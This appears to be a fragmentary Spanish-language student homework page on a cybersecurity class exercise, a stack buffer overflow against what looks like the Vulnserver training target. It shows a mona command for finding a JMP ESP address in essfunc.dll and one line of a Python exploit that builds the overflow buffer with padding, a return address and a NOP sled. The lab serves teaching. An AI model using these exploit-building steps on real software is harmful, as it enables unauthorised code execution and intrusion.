...
<marquee behavior="alternate" style="font-size: 32px; font-weight: 800; font-family: Algerian" >TAREA 3 - CIBERSEGURIDAD </marquee>

En clase, vimos como obtener las direcciones de retorno de la instrucción <code class="language-plaintext highlighter-rouge">JMP ESP</code>, la cual es la instrucción que le indica al runtime que debe retornar a la memoria de stack pointer.

<code class="language-plaintext highlighter-rouge">!mona find -s "\xff\xe4" -m essfunc.dll</code>
...
- Editando en el script python2 **7generating_shellcode.py**:
...
shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90"*32 + overflow #DEBEMOS MODIFICAR LAS DIRECCIONES COMO SE INDICA POSTERIORMENTE
...
- Debemos cambiar las diferentes direcciones en el script anterior y verificar si se cierra el servidor:
